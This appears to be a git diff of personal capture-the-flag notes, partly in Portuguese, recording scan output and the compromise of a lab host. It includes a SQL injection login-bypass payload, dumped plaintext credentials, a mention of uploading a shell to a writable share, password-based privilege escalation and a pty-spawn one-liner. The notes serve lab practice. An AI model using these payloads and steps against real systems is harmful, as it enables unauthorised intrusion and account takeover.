@@ -1,0 +1,67 @@
+rustscan:
+
+Open 10.67.173.84:22
+Open 10.67.173.84:139
+Open 10.67.173.84:445
+Open 10.67.173.84:8082
+Open 10.67.173.84:8080
+
+
+nmap:
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9a:ba:15:7a:77:95:b4:83:6b:06:aa:72:0b:2b:b7:2a (RSA)
+|   256 e6:75:02:6b:48:34:21:9a:5e:f8:3a:ab:90:78:e6:ae (ECDSA)
+|_  256 15:28:5a:ec:cb:34:68:79:25:7a:b6:fc:78:1c:8a:54 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 4.6.2
+445/tcp  open  netbios-ssn Samba smbd 4.6.2
+8080/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8082/tcp open  http        Node.js Express framework
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: IP-10-67-173-84, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-04-13T16:55:45
+|_  start_date: N/A
+|_clock-skew: -1s
+
+
+
+fuzzing:
+
+--> http://10.67.173.84:8080/dev/note.txt
+Secure File Upload and Testing Functionality
+
+
+voltando pra aba de login:
+http://10.67.173.84:8082/login
+payload: " or 1=1 or "
+
+credenciais encontradas:
+
+Username Password
+Tove Jani
+Godzilla KONGistheKING
+SuperMan snyderCut
+ArthurMorgan DeadEye   --> deu acesso! permissão de escrita em SECURED
+upei a shell la
+
+
+e escalei privilegio para o usuário ArthurMorgan com a senha dele
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+
+
+
